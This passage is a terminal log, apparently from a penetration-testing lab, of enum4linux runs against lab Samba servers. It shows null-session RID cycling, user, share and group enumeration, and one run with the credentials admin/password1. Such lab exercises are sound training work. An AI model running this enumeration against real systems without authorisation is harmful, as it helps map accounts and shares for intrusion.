S-1-5-21-4056189605-2085045094-1961111545-501 SAMBA-RECON\nobody (Local User)
S-1-5-21-4056189605-2085045094-1961111545-502 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-503 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-504 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-505 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-506 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-507 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-508 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-509 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-510 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-511 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-512 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-513 SAMBA-RECON\None (Domain Group)
S-1-5-21-4056189605-2085045094-1961111545-514 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-515 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-516 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-517 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-518 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-519 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-520 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-521 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-522 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-523 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-524 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-525 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-526 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-527 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-528 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-529 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-530 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-531 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-532 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-533 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-534 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-535 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-536 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-537 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-538 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-539 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-540 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-541 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-542 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-543 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-544 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-545 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-546 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-547 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-548 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-549 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-550 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1000 SAMBA-RECON\john (Local User)
S-1-5-21-4056189605-2085045094-1961111545-1001 SAMBA-RECON\shawn (Local User)
S-1-5-21-4056189605-2085045094-1961111545-1002 SAMBA-RECON\elie (Local User)
S-1-5-21-4056189605-2085045094-1961111545-1003 SAMBA-RECON\emma (Local User)
S-1-5-21-4056189605-2085045094-1961111545-1004 SAMBA-RECON\aisha (Local User)
S-1-5-21-4056189605-2085045094-1961111545-1005 SAMBA-RECON\admin (Local User)
S-1-5-21-4056189605-2085045094-1961111545-1006 SAMBA-RECON\Maintainer (Domain Group)
S-1-5-21-4056189605-2085045094-1961111545-1007 SAMBA-RECON\Reserved (Domain Group)
S-1-5-21-4056189605-2085045094-1961111545-1008 SAMBA-RECON\Testing (Local Group)
S-1-5-21-4056189605-2085045094-1961111545-1009 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1010 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1011 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1012 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1013 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1014 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1015 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1016 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1017 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1018 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1019 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1020 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1021 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1022 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1023 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1024 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1025 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1026 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1027 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1028 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1029 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1030 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1031 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1032 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1033 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1034 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1035 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1036 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1037 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1038 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1039 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1040 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1041 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1042 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1043 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1044 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1045 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1046 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1047 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1048 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1049 *unknown*\*unknown* (8)
S-1-5-21-4056189605-2085045094-1961111545-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\john (Local User)
S-1-22-1-1001 Unix User\shawn (Local User)
S-1-22-1-1002 Unix User\elie (Local User)
S-1-22-1-1003 Unix User\emma (Local User)
S-1-22-1-1004 Unix User\aisha (Local User)
S-1-22-1-1005 Unix User\admin (Local User)
[+] Enumerating users using SID S-1-22-2 and logon username '', password ''
S-1-22-2-1000 Unix Group\admins (Domain Group)
S-1-22-2-1001 Unix Group\Maintainer (Domain Group)
S-1-22-2-1002 Unix Group\Reserved (Domain Group)
S-1-22-2-1003 Unix Group\Testing (Domain Group)

 ============================================= 
|    Getting printer info for 192.54.223.3    |
 ============================================= 
No printers returned.


enum4linux complete on Tue Dec  5 06:38:33 2023


root@attackdefense:~# `enum4linux -U 192.54.223.3 -p 445`
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Dec  5 07:24:59 2023

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.54.223.3
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 192.54.223.3    |
 ==================================================== 
[+] Got domain/workgroup name: RECONLABS

 ===================================== 
|    Session Check on 192.54.223.3    |
 ===================================== 
[+] Server 192.54.223.3 allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for 192.54.223.3    |
 =========================================== 
Domain Name: RECONLABS
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ============================= 
|    Users on 192.54.223.3    |
 ============================= 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: john     Name:   Desc: 
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: elie     Name:   Desc: 
index: 0x3 RID: 0x3ec acb: 0x00000010 Account: aisha    Name:   Desc: 
index: 0x4 RID: 0x3e9 acb: 0x00000010 Account: shawn    Name:   Desc: 
index: 0x5 RID: 0x3eb acb: 0x00000010 Account: emma     Name:   Desc: 
index: 0x6 RID: 0x3ed acb: 0x00000010 Account: admin    Name:   Desc: 

user:[john] rid:[0x3e8]
user:[elie] rid:[0x3ea]
user:[aisha] rid:[0x3ec]
user:[shawn] rid:[0x3e9]
user:[emma] rid:[0x3eb]
user:[admin] rid:[0x3ed]
enum4linux complete on Tue Dec  5 07:24:59 2023


root@attackdefense:~# `enum4linux -S  192.120.159.3`
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Dec  5 11:42:58 2023

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.120.159.3
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 192.120.159.3    |
 ===================================================== 
[+] Got domain/workgroup name: RECONLABS

 ====================================== 
|    Session Check on 192.120.159.3    |
 ====================================== 
[+] Server 192.120.159.3 allows sessions using username '', password ''

 ============================================ 
|    Getting domain SID for 192.120.159.3    |
 ============================================ 
Domain Name: RECONLABS
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ========================================== 
|    Share Enumeration on 192.120.159.3    |
 ========================================== 

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      
        john            Disk      
        aisha           Disk      
        emma            Disk      
        everyone        Disk      
        IPC$            IPC       IPC Service (samba.recon.lab)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        RECONLABS            SAMBA-RECON

[+] Attempting to map shares on 192.120.159.3
//192.120.159.3/public  Mapping: OK, Listing: OK
//192.120.159.3/john    Mapping: DENIED, Listing: N/A
//192.120.159.3/aisha   Mapping: DENIED, Listing: N/A
//192.120.159.3/emma    Mapping: DENIED, Listing: N/A
//192.120.159.3/everyone        Mapping: DENIED, Listing: N/A
//192.120.159.3/IPC$    [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
enum4linux complete on Tue Dec  5 11:42:59 2023


root@attackdefense:~# `enum4linux -G  192.120.159.3`
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Dec  5 11:53:05 2023

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.120.159.3
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 192.120.159.3    |
 ===================================================== 
[+] Got domain/workgroup name: RECONLABS

 ====================================== 
|    Session Check on 192.120.159.3    |
 ====================================== 
[+] Server 192.120.159.3 allows sessions using username '', password ''

 ============================================ 
|    Getting domain SID for 192.120.159.3    |
 ============================================ 
Domain Name: RECONLABS
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 =============================== 
|    Groups on 192.120.159.3    |
 =============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:
group:[Testing] rid:[0x3f0]

[+] Getting local group memberships:

[+] Getting domain groups:
group:[Maintainer] rid:[0x3ee]
group:[Reserved] rid:[0x3ef]

[+] Getting domain group memberships:
enum4linux complete on Tue Dec  5 11:53:05 2023


root@attackdefense:/# `enum4linux -r -u "admin" -p "password1" 192.241.81.3`
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Dec  6 06:52:15 2023

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.241.81.3
RID Range ........ 500-550,1000-1050
Username ......... 'admin'
Password ......... 'password1'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 192.241.81.3    |
 ==================================================== 
[+] Got domain/workgroup name: RECONLABS

 ===================================== 
|    Session Check on 192.241.81.3    |
 ===================================== 
[+] Server 192.241.81.3 allows sessions using username 'admin', password 'password1'

 =========================================== 
|    Getting domain SID for 192.241.81.3    |
 =========================================== 
Domain Name: RECONLABS
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================================================= 
|    Users on 192.241.81.3 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[I] Found new SID: S-1-22-2
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-3690628376-3985617143-2159776750
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username 'admin', password 'password1'
S-1-22-1-1000 Unix User\shawn (Local User)
S-1-22-1-1001 Unix User\jane (Local User)
S-1-22-1-1002 Unix User\nancy (Local User)
S-1-22-1-1003 Unix User\admin (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username 'admin', password 'password1'
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-2 and logon username 'admin', password 'password1'
S-1-22-2-1000 Unix Group\admins (Domain Group)
S-1-22-2-1001 Unix Group\Maintainer (Domain Group)
S-1-22-2-1002 Unix Group\Reserved (Domain Group)
S-1-22-2-1003 Unix Group\Testing (Domain Group)
[+] Enumerating users using SID S-1-5-21-3690628376-3985617143-2159776750 and logon username 'admin', password 'password1'
S-1-5-21-3690628376-3985617143-2159776750-500 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-501 SAMBA-RECON-BRUTE\nobody (Local User)
S-1-5-21-3690628376-3985617143-2159776750-502 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-503 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-504 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-505 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-506 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-507 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-508 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-509 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-510 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-511 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-512 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-513 SAMBA-RECON-BRUTE\None (Domain Group)
S-1-5-21-3690628376-3985617143-2159776750-514 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-515 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-516 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-517 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-518 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-519 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-520 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-521 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-522 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-523 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-524 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-525 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-526 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-527 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-528 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-529 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-530 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-531 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-532 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-533 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-534 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-535 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-536 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-537 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-538 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-539 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-540 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-541 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-542 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-543 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-544 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-545 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-546 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-547 *unknown*\*unknown* (8)
